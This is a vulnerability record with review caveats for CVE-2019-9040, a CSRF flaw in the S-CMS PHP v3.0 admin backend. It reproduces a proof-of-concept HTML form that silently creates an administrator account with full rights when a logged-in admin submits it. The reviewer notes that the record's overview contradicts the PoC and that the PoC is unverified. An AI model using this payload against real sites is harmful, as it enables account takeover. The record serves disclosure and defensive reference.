---
cve: "CVE-2019-9040"
source: "Mr-xn/Penetration_Testing_POC"
product: "S-CMS企业PHP3.0"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2019-9040"
referenced_identifiers: ""
identifier_role: "primary"
identifier_status: "unknown"
title: "S-CMS企业建站系统PHP版v3.0后台存在CSRF可添加管理员权限账号.md"
prerequisites: "来源所述条件，未列明部分仍待核：已登录有管理员创建权限受害者、提交跨站表单且Cookie携带"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-92bec3c7e958e48df1c1d6db"
entity_id: "ve-92bec3c7e958e48df1c1d6db"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：已登录有管理员创建权限受害者、提交跨站表单且Cookie携带

- **代码与转录边界（1）**：标题/PoC actionadd是新增管理员，概述却更改管理员密码，明显模板错贴。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **适用与权限边界（2）**：表单无自动提交，不是仅访问页面；完整权限字段较清晰。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **事实待核（3）**：文件双.md.md命名噪声；缺响应/服务端检查/修复版。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# S-CMS企业建站系统PHP版v3.0后台存在CSRF可添加管理员权限账号

### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|S-CMS企业建站系统PHP版v3.0后台存在CSRF可添加管理员权限账号|2019-02-22|qn（137535957@qq.cn）|[https://www.s-cms.cn](https://www.s-cms.cn) | [https://www.s-cms.cn](https://www.s-cms.cn) |PHP v3.0| [CVE-2019-9040](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9040)|  

#### 漏洞概述  

> 恶意攻击者可以精心伪造一个html页面诱骗已登录的管理用户点击，从而更改管理员账户密码。   

### POC实现代码如下：  

> exp代码如下：  

``` html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1/1.com.php/admin/ajax.php?type=admin&action=add&lang=0" method="POST">
      <input type="hidden" name="A&#95;login" value="test1" />
      <input type="hidden" name="A&#95;pwd" value="test1" />
      <input type="hidden" name="A&#95;type" value="1" />
      <input type="hidden" name="A&#95;a0" value="1" />
      <input type="hidden" name="A&#95;a1" value="1" />
      <input type="hidden" name="A&#95;a2" value="1" />
      <input type="hidden" name="A&#95;a3" value="1" />
      <input type="hidden" name="A&#95;a4" value="1" />
      <input type="hidden" name="A&#95;a5" value="1" />
      <input type="hidden" name="A&#95;a6" value="1" />
      <input type="hidden" name="A&#95;a8" value="1" />
      <input type="hidden" name="A&#95;a10" value="1" />
      <input type="hidden" name="A&#95;a7" value="1" />
      <input type="hidden" name="A&#95;a9" value="1" />
      <input type="hidden" name="A&#95;a11" value="1" />
      <input type="hidden" name="A&#95;textauth&#91;&#93;" value="all" />
      <input type="hidden" name="A&#95;productauth&#91;&#93;" value="all" />
      <input type="hidden" name="A&#95;bbsauth&#91;&#93;" value="all" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```


---

> 来源：Mr-xn/Penetration_Testing_POC
